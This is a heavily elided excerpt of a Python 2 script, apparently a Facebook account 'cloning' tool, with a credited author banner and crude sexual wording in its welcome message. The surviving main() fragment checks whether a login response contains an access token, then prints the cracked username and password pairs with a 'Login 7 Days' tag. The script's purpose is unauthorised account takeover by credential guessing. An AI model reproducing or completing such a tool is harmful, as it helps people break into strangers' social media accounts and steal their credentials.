...
os.system('clear')
psb('\x1b[1;32m -- WEALCOME TO JOY & JIDAN SEX  CLONING START PLEASE WAIT ......')
...
logo = '\x1b[1;93m--------------------------------------------------\n \x1b[1;93m  ---> Author  -> JOY CHOWDHURY  <--- \n\x1b[1;93m-------------------------------------------------- \n\x1b[1;93m     Facebook  -> ChowdhurY  \n\x1b[1;93m--------------------------------------------------\n\x1b[1;93m  ---> Github -> Joy420 <--- \n\x1b[1;93m--------------------------------------------------'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                print '\x1b[1;93m[Sexy-DEAR-Cp]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
